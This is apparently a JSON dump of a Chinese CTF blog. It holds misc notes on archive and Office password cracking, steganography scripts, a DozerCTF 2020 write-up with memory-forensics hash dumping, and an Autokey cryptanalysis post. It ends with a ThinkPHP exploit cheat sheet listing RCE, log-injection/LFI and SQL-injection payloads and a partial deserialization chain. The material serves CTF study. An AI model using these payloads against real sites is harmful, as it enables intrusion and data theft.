[key1 key2 key3] -r [密码最大位数] ?[a-所有/p-可打印字符/d-数字/-l小写字母/-u大写字母]bkcrack -k be056038 0a143c0c 1ea08ca5 -r 16 ?a#还原bkcrack -C xxx.zip -c xxx.png -k be056038 0a143c0c 1ea08ca5 -d xxx.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-k 刚生成的三个key-d 最终还原的文件名 rar文件头：52 61 72 21（Rar!） 参考：https://blog.csdn.net/Claming_D/article/details/105899397 伪加密 查看第24个16进制数后面的数是0还是4，是4表示进行了伪加密，将4改为0就可以解除伪加密（修改对应RarBlock的CRC值）。 爆破工具 hashcat 1234567891011121314151617获得hash值rar2john xxx.rar &gt; rar.hash爆破hashcat -m 12500 -a 3 $RAR3$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txthashcat -m 13000 -a 3 $RAR5$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txt-m 根据rar类型进行选择，hashcat官方提供的参数有两种，RAR3-hp类型为12500，RAR5类型为13000-a 3 为掩码方式破解，掩码格式如下 ?d?d?d?d?d?d 表示为6位数字内置的掩码规则有：?l ：表示小写字母?u ：表示大写字母?d ：表示数字?s ：表示特殊字符?a ：表示上面四种的并集-o out.txt是输出结果 文本类txt 零宽 whitespace https://vii5ard.github.io/whitespace/ snow隐写 http://fog.misty.com/perry/ccs/snow/snow/snow.html snow -C -p password filename wbStego隐写 wbStego4open: http://wbstego.wbailer.com/ 文本盲水印 text_blind_watermark：https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html word 解压 word选项-显示-隐藏文字-勾选 解密 提取hash值：python3 office2john.py 1.docx &gt; hash.txt hashcat破解：hashcat -m 9400 --username hash.txt -a 3 ?d?d?d?d?d?d?d?d -o cracked_pass.txt excel 解压 pdf wbStego4open http://wbstego.wbailer.com/ 密码爆破 pdfcrack pyc / pyo stegosaurus（字节码） https://github.com/AngelKitty/stegosaurus 命令（尽量用Python3.6运行）： python3 stegosaurus.py -x main.pyc python3 -m stegosaurus main.pyc -x 其他在线工具vbe解密（#@~^ 开头）：https://master.ayra.ch/vbs/vbs.aspx 常用脚本图片处理CRC宽高爆破（png）123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() 快速傅里叶变换（FFT）1234567891011121314import cv2 as cvimport numpy as npimport matplotlib.pyplot as pltimg = cv.imread(&#x27;FFT.png&#x27;, 0) #读为灰度图像f = np.fft.fft2(img) #做频率变换fshift = np.fft.fftshift(f) #转移像素做幅度谱s1 = np.log(np.abs(fshift))#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255plt.subplot(121)plt.imshow(img, &#x27;gray&#x27;)plt.title(&#x27;original&#x27;)plt.subplot(122)plt.imshow(s1,&#x27;gray&#x27;)plt.title(&#x27;center&#x27;)plt.show() ​ 音频处理12import scipy.io.wavfile as wavsample_rate, data = wav.read(&quot;1.wav&quot;) FM调制解调1234567891011121314151617181920212223242526import numpy as npfrom scipy.signal import decimatefrom scipy.io.wavfile import write# 读取complex64格式的信号⽂件signal = np.fromfile(&#x27;fm-complex64-sample_rate-320khz-dec_ratio-20_1&#x27;, dtype=np.complex64)# 解调FM信号phase = np.angle(signal)phase_diff = np.unwrap(phase[1:] - phase[:-1])audio_signal = np.diff(phase_diff)# 降采样到16kHz(抽取率是20:1)downsampled_audio = decimate(audio_signal, 20)# 应⽤增益gain = 30.0 # 增益因⼦，调整这个值来提⾼⾳量amplified_audio = downsampled_audio * gain# 归⼀化max_amplitude = np.max(np.abs(amplified_audio))if max_amplitude &gt; 1.0: amplified_audio /= max_amplitude # 归⼀化到[-1, 1]# 保存为WAV⽂件write(&#x27;output_audio.wav&#x27;, 16000, amplified_audio.astype(np.float32)) ​ 压缩包处理解压缩123456789101112131415import pyzipper# 要解压的带密码的 zip 文件zip_filename = &#x27;DontCome0ver.zip&#x27;# 解压目标文件夹output_dir = &#x27;./zip&#x27;# 设置密码password = &#x27;123456&#x27;# 解压文件with pyzipper.AESZipFile(zip_filename, &#x27;r&#x27;) as zf: zf.pwd = password.encode(&#x27;utf-8&#x27;) zf.extractall(output_dir) 遍历zip压缩包12345678910111213141516import os.pathimport zipfileimport redir_path=&#x27;xxxxxxxx&#x27;files= os.listdir(dir_path)newfiles = files[::-1]print(newfiles)setee = []for file in newfiles: #遍历文件夹 position = dir_path+&#x27;\\\\&#x27;+ file #构造绝对路径，&quot;\\\\&quot;，其中一个&#x27;\\&#x27;为转义符 print (position) z = zipfile.ZipFile(position, &#x27;r&#x27;) for filename in z.namelist(): bytes = z.read(filename) if b&#x27;Zmxh&#x27; in bytes: print(filename) zlib解压字符串123456import zlibdata = open(&quot;zlib_hex_data.txt&quot;, &#x27;r&#x27;, encoding=&quot;utf-8&quot;).read().replace(&quot; &quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;).strip()data_dec = zlib.decompress(bytes.fromhex(data))print(data_dec[:100])with open(&quot;zlib_data.rar&quot;, &#x27;wb&#x27;) as wf: wf.write(data_dec) 其他在线工具解码社会主义核心价值观：http://www.atoolbox.net/Tool.php?Id=850 佛曰：https://ctf.bugku.com/tool/todousharp 新佛曰：http://hi.pcmoe.net/buddha.html emoji-AES：https://aghorler.github.io/emoji-aes/ 乱码恢复：http://www.mytju.com/classcode/tools/messycoderecover.asp 其他wordle 填字：https://www.wsolver.com/ sokudo 数独：https://shudu.gwalker.cn/ virustotal 文件检测：https://www.virustotal.com/gui/home/upload Tupper自指公式：https://tuppers-formula.ovh/ base-decode 任意base解码：https://basecrack.herokuapp.com/ brainfuck分析：http://pablojorge.github.io/brainfuck/ 金笛短信PDU编码解码工具：http://www.sendsms.cn/pdu/ 汉信码识别器：https://tuzim.net/hxdecode/","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"}],"author":"Lazzaro"},{"title":"DozerCTF 2020","slug":"match-DozerCTF-2020","date":"2020-06-14T13:00:00.000Z","updated":"2020-06-26T10:47:09.519Z","comments":true,"path":"2020/06/14/match-DozerCTF-2020/","permalink":"https://lazzzaro.github.io/2020/06/14/match-DozerCTF-2020/","excerpt":"","text":"CRYPTO真·签到 这是真的签到题 附件：baby_base.exe 查看文本，Base64+Base32+Hex+Base58 解码得flag。 ​ easy_bag 这莫非就是传说中的灵异背包？ nc 118.31.11.216 30003 提示很明显，背包密码。 nc取得公钥与密文，修改参考脚本后Sage运行得flag： 1234567891011121314151617181920212223242526272829303132333435###Sage###import binasciipubKey = [] #公钥pubKey = pubKey.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)encoded = #密文encoded = encoded.replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print i, M M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print(bytes.fromhex(M)) ​ REVERSE貌似有些不对 这是谁的课程设计？做的好烂！ 附件：Cipher.exe IDA查看字符串，发现 OEG7U19kUvCsV29qzT9qcUm0yDCwy2CiWjOrU2Or 及 ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/，猜测为自定义码表的Base64编码。 CyberChef解码得 Dr&#123;__g_!ocomiom&#125;ztlasoaefdn_dn。 根据最终flag格式 Dozerctf&#123;xxx&#125;，对比尝试用栅栏密码解密： Dr&#123;__g_! ocomiom&#125; ztlasoa efdn_dn 按上下顺序取出拼接得到flag。 ​ MISCupload where is the file？（flag格式Dozerctf{XXXXXXXXXXXXXXX}） 链接：https://share.weiyun.com/frfkQQvq 密码：rkbpx2 wireshark打开pcap流量包，文件→导出对象→HTTP，发现flag.jpg文件。 保存到本地，用010editor查看文件头504B0304为zip压缩文件格式。 修改文件名flag.zip，打开发现需要密码，其中的5个txt文件均为6字节大小。 用6字节CRC碰撞脚本分别爆破5个文件CRC值，选取有含义的爆破值为每个文件的内容，拼接得flag。 ​ py吗？ 链接：https://share.weiyun.com/btEdYZcA 密码：ssihnd png图，LSB低位隐写，Stegsolve提取出一串字符串，Base64解码出flag。 ​ 夏日计划 欢迎来到夏日计划，enjoy the game 链接：https://share.weiyun.com/MUdUEP0h 密码：twfn5u 010editor查看下载文件的文件头Rar，为rar文件格式。 360压缩打开压缩包，发现important.txt:secret.rar，为NTFS隐写，提取出secret.rar。 尝试打开secret.rar发现有错误，使用WinRAR修复压缩包，得到secret1/secret2/secret3/secret4四个文件，打开发现每行两个数，易知为坐标。 拼接四个文件，使用gnuplot画图工具，plot画图命令得到一个图片，有网鼎杯经验不难知为汉信码，但被反色处理过。 反色与修复处理得到汉信码，用极不稳定在线识别器http://www.efittech.com/hxdec.html 解码得flag。 ​ easy_analysis Can you find the secret from her/his computer? 链接：https://share.weiyun.com/lAcsmVU6 密码：xqrxwg 内存取证，上volatility工具分析一波，每种使用情况都查看一遍。 查看profile值： volatility -f memory imageinfo 得到profile值为Win7SP1x64。 按关键字扫描文件： volatility -f memory --profile=Win7SP1x64 filescan | grep &quot;flag&quot; 结果： 0x000000001e2fa940 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e314f20 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e76e070 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e85f430 2 0 RW---- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag\\analys 尝试导出analys文件： volatility -f memory --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000001e85f430 010editor查看为zip文件，改文件名打开，加密，有提示： Why you don’t know my password? It’s so easy. Maybe you can log in to my computer. 猜测与登录信息有关。 提取登录用户信息，查看password hash： volatility -f memory --profile=Win7SP1x64 hivelist （列举缓存在内存中的注册表） volatility -f memory --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ （提取注册表system和SAM虚拟地址的hash内容） 结果： Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::13m0nade:1000:aad3b435b51404eeaad3b435b51404ee:575f5313970908467a19d3a5aa269743::: 尝试在线md5解密 31d6cfe0d16ae931b73c59d7e0c089c0 和 575f5313970908467a19d3a5aa269743： 31d6cfe0d16ae931b73c59d7e0c089c0 → [空密码] 575f5313970908467a19d3a5aa269743 → AaBbCc123 用AaBbCc123解密zip文件成功，得到flag.zip和usb.pcap。 flag.zip，加密，有提示： 密码很长，字母全部小写 wireshark打开usb.pcap，易知为usb流量，先用tshark工具得到leftover capture data： tshark -r usb.pcap -T fields -e usb.capdata 再用以下脚本或UsbKeyboardDataHacker脚本恢复击键信息： 123456789101112131415161718mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;usbdata.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[2]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[6]!=&#x27;0&#x27; or line[7]!=&#x27;0&#x27; or line[8]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[11]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[14]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27;: continue nums.append(int(line[4:6],16)) # 00:00:xx:....keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print(&#x27;output :n&#x27; + output) 结果： output :n[unknown][unknown][DEL][DEL][DEL][DEL]nnn[unknown]UTO KEY[DEL][DEL][DEL][DEL]KEY YLLTMFTNXBKGVCYYDBUHDLCPSPSPS[DEL]TSWRMWJJMNJGTYLKEGITTOIBGO[DEL]O GOOD LUCK 猜测为Autokey加密，密文：YLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGO。 修改脚本爆破，结果： -359.75078413 autokey, klen 3 :&quot;KGT&quot;, OFSFHNOGKNEWIYCQFZECEHALLPHEELSNBEWIIRBYCXNIHTAMAOWBSS-324.335522444 autokey, klen 4 :&quot;GHAT&quot;, SELAUBINDACTSCWFLZYCSMENADOCTPIPTHBUTGIMASDYEOFVPADGRO-323.532048185 autokey, klen 5 :&quot;XRAEF&quot;, BULPHEZCIUGHTUESWIADLPUPPEDVEDSORSGRYWRACAPTEEIEAKETCO-327.336020209 autokey, klen 6 :&quot;WGUMES&quot;, CFRHINRIGUCTEUSEBIQNLHBHCCHISLUPFORYSYESCATMAOGTACINAV-306.901215421 autokey, klen 7 :&quot;QSLAYRJ&quot;, ITATOOKFEBRSHSTUCKCALSININSEBKJJZEFICEAHPTDIAGBEALABAN-297.048582118 autokey, klen 8 :&quot;UISMBHTT&quot;, EDTHLYAUTYRZKEYEKDDITHELIMPHALSGEKUCMCRAPORISERTEARTOK-255.780042935 autokey, klen 9 :&quot;KEYFORZIP&quot;, OHNOYOUFINDTHEKEYTHEKEYFORZIPISTHISKEYBOARDSUCKSFORYOU 得到解压密码thiskeyboardsuckforyou，得到flag.txt。 打开发现多行Base64编码密文，解码得到16进制字符串，开头89504E47为png文件头，还原得到的png图片无信息。 猜测为Base64隐写，尝试跑解密脚本，得到flag~","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"自动密钥密码","slug":"crypto-自动密钥密码","date":"2020-06-14T07:32:12.000Z","updated":"2020-09-19T08:05:30.597Z","comments":true,"path":"2020/06/14/crypto-自动密钥密码/","permalink":"https://lazzzaro.github.io/2020/06/14/crypto-%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81/","excerpt":"","text":"自动密钥密码（Autokey密码/Autokey Cipher）自动密钥密码是密码学中的一种加密算法，与维吉尼亚密码类似，区别在于密钥不同。它的密钥开头是一个关键词，之后则是明文的重复。 示例 下面演示的是一种自动密钥密码的加密方法。先假设关键词为QUEENLY，而文本信息为ATTACK AT DAWN，则自动生成的密钥为”QUEENLYATTACKATDAWN”。之后再通过维吉尼亚密码的表格法生成密文： 123明文：ATTACK AT DAWN...密钥：QUEENL YA TTACK AT DAWN....密文：QNXEPV YT WTWP... 破译方法 假设明文为MEET AT THE FOUNTAIN，关键词为KILT： 123明文：MEETATTHEFOUNTAIN（未知）密钥：KILTMEETATTHEFOUN（未知）密文：WMPMMXXAEYHBRYOCA（已知） 我们尝试一些常用单词、双字母组、三字母组等在密钥中的可能位置，如THE： 1234567891011密文：WMP MMX XAE YHB RYO CA密钥：THE THE THE THE THE ..明文：DFL TFT ETA FAX YRK ..密文：W MPM MXX AEY HBR YOC A密钥：. THE THE THE THE THE .明文：. TII TQT HXU OUN FHY .密文：WM PMM XXA EYH BRY OCA密钥：.. THE THE THE THE THE明文：.. WFI EQW LRD IKU VVW 我们将这些明文片段按出现的可能性排列： 12不可能 &lt;--------------------------&gt;最可能EQW DFL TFT ... ... ... ... ETA OUN FAX 由于正确的明文片段同样也会出现在密钥中，因此可以将其偏移关键词的长度而得到密钥片段。同样地，我们猜测的密钥片段THE也会出现在明文中。因此，猜测关键词的长度（譬如说3到12之间），我们就能得到明文和密钥。 尝试OUN可能得到： 1234567891011121314偏移4位：密文：WMPMMXXAEYHBRYOCA密钥：......ETA.THE.OUN明文：......THE.OUN.AIN偏移5位：密文：WMPMMXXAEYHBRYOCA密钥：.....EQW..THE..OU明文：.....THE..OUN..OG偏移6位：密文：WMPMMXXAEYHBRYOCA密钥：....TQT...THE...O明文：....THE...OUN...M 看起来偏移量为4时的可能性最大（其他的都含有不太可能出现的Q），因此我们再将新得到的ETA偏移4位： 123密文：WMPMMXXAEYHBRYOCA密钥：..LTM.ETA.THE.OUN明文：..ETA.THE.OUN.AIN 我们知道了关键词的长度很可能是4位（以LT结尾），且已有了文本的一部分： 1..ETA.THE.OUN.AIN 之后以此为依据再进行一些猜测，可以验证如下是真正的明文： 1MEETATTHEFOUNTAIN 脚本 参考：http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ 相关模块及文件： quadgrams.txt：http://www.practicalcryptography.com/media/cryptanalysis/files/quadgrams.txt trigrams.txt：http://www.practicalcryptography.com/media/cryptanalysis/files/trigrams.txt ngram_score：http://www.practicalcryptography.com/media/cryptanalysis/files/ngram_score_1.py 123456789101112131415161718192021222324252627282930### ngram_score.py ###&#x27;&#x27;&#x27;Allows scoring of text using n-gram probabilities17/07/12&#x27;&#x27;&#x27;from math import log10class ngram_score(object): def __init__(self,ngramfile,sep=&#x27; &#x27;): &#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27; self.ngrams = &#123;&#125; for line in open(ngramfile): key,count = line.split(sep) self.ngrams[key] = int(count) self.L = len(key) self.N = sum(self.ngrams.values()) #calculate log probabilities for key in self.ngrams.keys(): self.ngrams[key] = log10(float(self.ngrams[key])/self.N) self.floor = log10(0.01/self.N) def score(self,text): &#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27; score = 0 ngrams = self.ngrams.__getitem__ for i in range(len(text)-self.L+1): if text[i:i+self.L] in self.ngrams: score += ngrams(text[i:i+self.L]) else: score += self.floor return score 核心脚本（python3）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465### break_autokey.py ###from ngram_score import ngram_scorefrom pycipher import Autokeyimport refrom itertools import permutationsqgram = ngram_score(&#x27;quadgrams.txt&#x27;)trigram = ngram_score(&#x27;trigrams.txt&#x27;)ctext = &#x27;isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl&#x27;ctext = re.sub(r&#x27;[^A-Z]&#x27;,&#x27;&#x27;,ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self,N=1000): self.store = [] self.N = N def add(self,item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self,k): return self.store[k] def __len__(self): return len(self.store)#initN=100for KLEN in range(3,20): rec = nbest(N) for i in permutations(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;,3): key = &#x27;&#x27;.join(i) + &#x27;A&#x27;*(KLEN-len(i)) pt = Autokey(key).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += trigram.score(pt[j:j+3]) rec.add((score,&#x27;&#x27;.join(i),pt[:30])) next_rec = nbest(N) for i in range(0,KLEN-3): for k in range(N): for c in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;: key = rec[k][1] + c fullkey = key + &#x27;A&#x27;*(KLEN-len(key)) pt = Autokey(fullkey).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += qgram.score(pt[j:j+len(key)]) next_rec.add((score,key,pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Autokey(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Autokey(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print(bestscore,&#x27;autokey, klen&#x27;,KLEN,&#x27;:&quot;&#x27;+bestkey+&#x27;&quot;,&#x27;,Autokey(bestkey).decipher(ctext))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"Base64隐写","slug":"misc-Base64隐写","date":"2020-06-14T04:00:48.000Z","updated":"2023-12-24T15:44:38.722Z","comments":true,"path":"2020/06/14/misc-Base64隐写/","permalink":"https://lazzzaro.github.io/2020/06/14/misc-Base64%E9%9A%90%E5%86%99/","excerpt":"","text":"原理Base64的编码过程就是将文本字符对应成二进制后，再六个一组对应成索引，转为编码字符。如果字符串长度不是3的 倍数，则对应的二进制位数不是6的倍数，需要在末尾用0填充。若剩1个字符则在编码结果后加2个‘=’；若剩2个字符则 加1个‘=’。 Base64的解码过程，即先丢弃编码后面的‘=’，然后将每个base64字符对应索引转为6bit的二进制数，再8个一组转为ASCII码字符完成解码，最后若剩下不足8位的，则全部丢弃。 所以某些bit位在解码时会被丢弃，换句话说，这些bit值不会对解码结果产生影响。一个简单直观的例子就是QUJDRA和QUJDRC解码后都是ABCD。由此我们便可以将隐藏信息插入这些bit位中实现隐写。 一串Base64的编码最多也只有4bit的隐写空间，所以实现隐写往往需要大量编码串。隐写时把明文的每个字符用8位二进制数表示，由此将整个明文串转为bit串，按顺序填入Base64编码串的可隐写位中即可实现隐写。 加密123456789101112131415# -*- coding: utf-8 -*-import base64flag = &#x27;flag&#123;Base64isF4n&#125;&#x27; #flagbin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag])base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as f0, open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as f1: #&#x27;0.txt&#x27;是明文, &#x27;1.txt&#x27;用于存放隐写后的 base64 for line in f0.readlines(): rowstr = base64.b64encode(line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)) equalnum = rowstr.count(&#x27;=&#x27;) if equalnum and len(bin_str): offset = int(&#x27;0b&#x27;+bin_str[:equalnum * 2], 2) char = rowstr[len(rowstr) - equalnum - 1] rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset]) bin_str = bin_str[equalnum*2:] f1.write(rowstr + &#x27;\\n&#x27;) 解密1234567891011121314151617d=&#x27;&#x27;&#x27;str&#x27;&#x27;&#x27;e=d.splitlines()binstr=&quot;&quot;base64=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;for i in e : if i.find(&quot;==&quot;)&gt;0: temp=bin((base64.find(i[-3])&amp;15))[2:] #取倒数第3个字符，在base64找到对应的索引数（就是编码数），取低4位，再转换为二进制字符 binstr=binstr + &quot;0&quot;*(4-len(temp))+temp #二进制字符补高位0后，连接字符到binstr elif i.find(&quot;=&quot;)&gt;0: temp=bin((base64.find(i[-2])&amp;3))[2:] #取倒数第2个字符，在base64找到对应的索引数（就是编码数），取低2位，再转换为二进制字符 binstr=binstr + &quot;0&quot;*(2-len(temp))+temp #二进制字符补高位0后，连接字符到binstrstr=&quot;&quot;for i in range(0,len(binstr),8): str=str+chr(int(binstr[i:i+8],2)) #从左到右，每取8位转换为ascii字符，连接字符到字符串print(str)","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"CMS","slug":"web-CMS","date":"2020-05-24T12:24:48.000Z","updated":"2024-08-12T10:48:39.282Z","comments":true,"path":"2020/05/24/web-CMS/","permalink":"https://lazzzaro.github.io/2020/05/24/web-CMS/","excerpt":"","text":"​ 网站识别：https://www.wappalyzer.com/ Exploit Database: https://www.exploit-db.com/ PHPGGC: https://github.com/ambionics/phpggc 对比源码：diff -r DirA DirB ​ ThinkPHP版本关键字：THINK_VERSION 日志默认形式：如 /202110/11.log（/年月/日.log） 控制器驼峰命名法控制器如 M1sakaM1yuu，在ThinkPHP官方文档中，访问的正确方式应该是index/m1saka_m1yuu/index，中间使用下划线隔开，但是兼容了index/M1sakaM1yuu/index这样的访问方式，新官方补丁修复后，不允许路由中存在大写字母。 工具Lucifer1993/TPscan theLSA/tp5-getshell sukabuliet/ThinkphpRCE bewhale/thinkphp_gui_tools 2.x 2.x RCE index.php?s=/index/index/name/$&#123;phpinfo()&#125; 3.2.x日志：&lt;domain&gt;/Application/Runtime/Logs/Home/21_04_27.log 通用 SQL注入+文件读取+反序列化 ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 RCE / LFI ThinkPHP3.2.x RCE漏洞通报 如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。 debug模式关 index.php?m=--&gt;&lt;?=phpinfo();?&gt; LFI： index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log 或 index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log debug模式开 index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; LFI： index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log 或 index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log 限定条件下参数的收集（替换变量名） param/name/value/array/arr/info/list/page/menus/var/data/moudle/module 3.2.3 SQL注入 index.php?m=Home&amp;c=Index&amp;a=index2&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?username[0]=exp&amp;username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)] 变量覆盖 empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content); 反序列化+SQL注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpnamespace Think\\Image\\Driver;use Think\\Session\\Driver\\Memcache;class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125;&#125;namespace Think\\Session\\Driver;use Think\\Model;class Memcache &#123; protected $handle; public function __construct()&#123; $this-&gt;sessionName=null; $this-&gt;handle= new Model(); &#125;&#125;namespace Think;use Think\\Db\\Driver\\Mysql;class Model&#123; protected $pk; protected $options; protected $data; protected $db; public function __construct()&#123; $this-&gt;options[&#x27;where&#x27;]=&#x27;&#x27;; $this-&gt;pk=&#x27;x&#x27;; 